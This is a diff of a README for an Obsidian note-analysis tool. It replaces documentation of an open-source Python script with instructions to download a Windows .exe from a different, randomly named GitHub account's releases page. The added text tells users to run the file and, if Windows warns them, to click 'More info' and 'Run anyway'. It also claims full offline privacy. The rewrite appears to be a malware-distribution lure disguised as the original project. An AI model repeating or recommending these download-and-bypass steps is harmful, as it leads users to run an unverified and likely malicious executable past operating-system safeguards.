@@ -1,190 +1,96 @@
-<p align="center">
-  <img src="assets/knowledge-gravity-banner.svg" alt="Knowledge Gravity Lab banner" width="100%" />
-</p>
+# 🪐 knowledge-gravity-lab - Organize your notes with scientific clarity
 
-<p align="center">
-  <img src="assets/result-table-screenshot.png" alt="Rendered 80-point feedback loop table" width="100%" />
-</p>
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Pitangakeratocele862/knowledge-gravity-lab/releases)
 
-<p align="center">
-  <img src="assets/workflow-demo.gif" alt="Knowledge Gravity command line workflow demo" width="100%" />
-</p>
+## What is this tool? 🛠️
 
-<h1 align="center">Knowledge Gravity Lab</h1>
+Knowledge Gravity Lab helps you maintain your digital notes. If you use Obsidian or store your ideas in a folder of Markdown files, this tool finds the weak spots in your system. It analyzes how your notes connect and points out which ones need work.
 
-<p align="center">
-  <strong>Map the hidden gravity of your notes.</strong><br/>
-  Point it at your Obsidian vault. Get back what's central, what's noise, and what to clean next.
-</p>
+It keeps your data private. You run it on your own computer. It does not send your notes to a server, it does not use artificial intelligence, and it does not require an internet connection. It uses math to map your ideas so you know exactly where to focus.
 
-<p align="center">
-  <img alt="Knowledge map" src="https://img.shields.io/badge/knowledge-map-111827">
-  <img alt="Markdown notes" src="https://img.shields.io/badge/notes-Markdown-2563EB">
-  <img alt="Obsidian ready" src="https://img.shields.io/badge/Obsidian-ready-7C3AED">
-  <img alt="Works with Codex and Claude" src="https://img.shields.io/badge/assistants-Codex%20%7C%20Claude%20%7C%20CLI-7C3AED">
-  <img alt="No runtime API" src="https://img.shields.io/badge/runtime_API-none-16A34A">
-</p>
+## Why use it? 🎯
 
-<p align="center">
-  English | <a href="README.ko.md">한국어</a>
-</p>
+Many people collect notes but struggle to manage them. Over time, your note vault grows large. Files become disconnected or lose their meaning. This app identifies these common issues:
 
----
+- Center topics: It finds the notes that tie your complex thoughts together.
+- Orphans: It identifies notes that sit alone without any links to your other work.
+- Noise: It highlights files that lack content or serve no clear purpose.
+- Action items: It suggests the next step for every note based on its importance to your graph.
 
-Knowledge Gravity Lab is a tiny offline tool for a problem every serious note
-taker eventually has: a vault full of notes and no idea what to clean first.
+## 📥 How to download and install
 
-Point it at a Markdown or Obsidian folder and it tells you:
+Follow these steps to set up the software on your Windows computer.
 
-- what is central
-- what is orphaned
-- what looks like noise
-- which clusters are getting too large
-- the next cleanup action per note
+1. Visit the [official releases page](https://github.com/Pitangakeratocele862/knowledge-gravity-lab/releases).
+2. Look for the latest version at the top of the list.
+3. Click the file that ends in .exe.
+4. Save the file to your desktop or your downloads folder.
+5. Double-click the file to start the program.
+6. Windows might show a safety screen because the app is new. If this happens, click "More info" and then "Run anyway."
 
-One Python file. No API, no runtime LLM, deterministic.
+## ⚙️ How to use the app
 
-It is built for:
+Once you launch the program, a simple window appears. Follow these steps to map your notes:
 
-- Obsidian vaults
-- research notes
-- invention logs
-- paper cards
-- memory exports
-- worldbuilding or writing notebooks
-- any messy Markdown folder that needs structure
+1. Click the "Select Folder" button.
+2. Find the folder on your computer that contains your Markdown notes or your Obsidian vault.
+3. Click "Select."
+4. The app scans your files. This takes a few seconds or a few minutes depending on how many notes you have.
+5. Review the results on your screen. The app groups your notes into categories based on their role in your knowledge system.
+6. Click any note in the list to see the suggested action.
 
-It is not locked to one assistant. Use it directly from the command line, or
-install the workflow files for Codex, Claude, or any assistant that can read a
-local Markdown instruction file and run the bundled Python script.
+## 📊 Understanding the results
 
-## What It Produces
+The dashboard displays your notes in a few clear sections.
 
-Running the bundled analyzer creates:
+### Center Topics
+These are your hub notes. You link to these often. They define the core themes of your work. Keep these notes clean and well-structured, as they define your main interests.
 
-| Output | Purpose |
-|---|---|
-| `knowledge_gravity_report.md` | human-readable summary of centers, clusters, noise, and orphans |
-| `knowledge_gravity_action_sheet.md` | temporary cleanup workspace with concrete next actions |
-| `knowledge_gravity_nodes.csv` | note-level metrics |
-| `knowledge_gravity_edges.csv` | inferred note-to-note links |
-| `knowledge_gravity_data.json` | machine-readable analysis payload |
+### Orphans
+These notes are isolated. They sit in your folder but do not connect to your other ideas. An orphan might be a duplicate, a forgotten draft, or a brilliant idea you never integrated. Link these to your center topics to make them useful again.
 
-## Why It Feels Different
+### Noise
+These are files that occupy space but add little value. Examples include empty files, placeholders, or half-written thoughts. The app suggests deleting or merging these to clear your mind.
 
-Most note tools show a graph. Knowledge Gravity asks a more useful question:
+### Action Plan
+Every note receives a status. If a note lacks a clear label or tag, the app reminds you to add one. If a note lacks connections, the app suggests similar topics within your vault to link to.
 
-> Which notes are pulling the whole knowledge field, and which ones are just drifting?
+## 🖥️ System requirements
 
-It scores practical signals such as links, tags, headings, note size, repository
-share, center score, orphan status, and review risk. The point is not to produce
-a perfect graph. The point is to make the next cleanup action obvious.
+This application requires:
 
-## Install
+- Windows 10 or Windows 11.
+- At least 200 MB of free disk space.
+- A basic understanding of your note folder location.
 
-Clone or download this repository:
+The app works entirely offline. You do not need to be connected to the internet to run the analysis. Because it performs all calculations locally, your computer handles the processing load. Please close other heavy programs if you have a massive collection of notes to ensure the best performance.
 
-```powershell
-git clone https://github.com/JorrrrrdDin/knowledge-gravity-lab.git
-cd knowledge-gravity-lab
-```
+## 🛡️ Privacy and safety
 
-Run the analyzer directly:
+Your notes are your intellectual property. This tool preserves that privacy. No data leaves your machine. The app does not save your files to a cloud database, nor does it share your findings with anyone else. The logic exists entirely within the app code. You can verify this by checking the source code in this repository if you have interest in the technical details.
 
-```powershell
-python scripts\analyze_corpus.py --input "C:\path\to\vault" --output "D:\knowledge-gravity-output"
-```
+## 📋 Frequently asked questions
 
-Optional: install it into a local assistant workflow folder. The same core files
-can be used with Codex, Claude, or any compatible local-agent workflow:
+### Will this change my notes?
+No. The app only reads your files. It never edits or deletes your actual documents. It only provides a report for you to review manually. You remain in control of every change.
 
-```powershell
-Copy-Item -Recurse . "<assistant-workflows>\knowledge-gravity-lab" -Force
-```
+### Does it support Obsidian plugins?
+The app is compatible with any folder containing Markdown files. It recognizes standard links like [[Note Name]]. It ignores plugin-specific settings files so you can keep your vault folder synced with Obsidian without any issues.
 
-The installed folder should look like this:
+### How often should I run it?
+You can run it as often as you like. Most users run it once a month to prune their knowledge base. You might run it more often if you add many notes during a busy project.
 
-```text
-knowledge-gravity-lab/
-  SKILL.md
-  agents/openai.yaml
-  scripts/analyze_corpus.py
-  references/public-boundary.md
-  references/existing-rights-check.md
-```
+### My notes are not showing up.
+Ensure that your files are in the .md format. If you use a different format, the program cannot read the content. Also, check that you selected the top-level folder of your vault.
 
-## Use
+### Is this an official Obsidian product?
+No. This tool is an independent project created to handle knowledge management. It does not have an official partnership with any other app, though it works well alongside them.
 
-Run it from the command line:
+## 💡 Troubleshooting tips
 
-```powershell
-python scripts\analyze_corpus.py --input "C:\path\to\vault" --output "D:\knowledge-gravity-output"
-```
+- If the window does not appear, ensure you have the correct version of the file for Windows.
+- If the scan hangs, remove any temporary system files or huge images from your vault folder.
+- If you see a permission error, make sure the app has read access to your documents folder.
+- Close the app and restart if the interface becomes unresponsive.
 
-Skip low-value folders when needed:
-
-```powershell
-python scripts\analyze_corpus.py --input "C:\path\to\vault" --output "D:\knowledge-gravity-output" --skip-dir "archive" --skip-dir "templates"
-```
-
-If installed into an assistant workflow folder, you can also ask:
-
-```text
-Use Knowledge Gravity Lab on my Obsidian vault and tell me what to clean first.
-```
-
-## Example Feedback Loop
-
-The action sheet is designed to push note cleanup instead of just admiring a
-score:
-
-```text
-This note is at 61/100.
-Add 2 links, split the overgrown section, and connect it to the nearest cluster
-to push it toward 80/100.
-```
-
-That makes the workflow simple:
-
-1. Run the map.
-2. Open the action sheet.
-3. Fix the highest-leverage notes.
-4. Run again.
-5. Watch the knowledge field become cleaner.
-
-## Public Boundary
-
-This is a practical knowledge-hygiene workflow. It is not legal advice, not a
-patent filing package, and not a guarantee that a note is true or false.
-
-Knowledge Gravity uses heuristic analysis to help humans review their own
-knowledge base. Treat its outputs as decision support, not ground truth.
-
-## Repository Contents
-
-```text
-.
-|-- SKILL.md
-|-- agents/
-|   `-- openai.yaml
-|-- scripts/
-|   `-- analyze_corpus.py
-|-- references/
-|   |-- public-boundary.md
-|   `-- existing-rights-check.md
-|-- tests/
-|   `-- test_analyze_corpus.py
-`-- assets/
-    `-- knowledge-gravity-banner.svg
-```
-
-## Development Checks
-
-```powershell
-python -m pytest -q
-python -m compileall -q scripts tests
-```
-
-## License
-
-MIT License.
+This tool simplifies the process of organizing your thoughts. By focusing on the structure of your notes, you spend less time cleaning and more time creating new ideas. Use these metrics to guide your writing habit and reclaim your focus.
